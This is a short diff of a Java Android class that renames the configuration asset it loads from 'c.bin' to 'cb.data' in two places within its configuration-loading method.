@@ -618,7 +618,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConf): TRY JSONCONF");
 			}
 
-			final byte[] resource = Utils.getAsset(M.e("c.bin")); // config.bin
+			final byte[] resource = Utils.getAsset(M.e("cb.data")); // config.bin
 			String json = new String(resource);
 			// Initialize the configuration object
 
@@ -643,7 +643,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConf): TRY ASSET CONF");
 			}
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.getAsset(M.e("c.bin")); // config.bin
+			final byte[] resource = Utils.getAsset(M.e("cb.data")); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
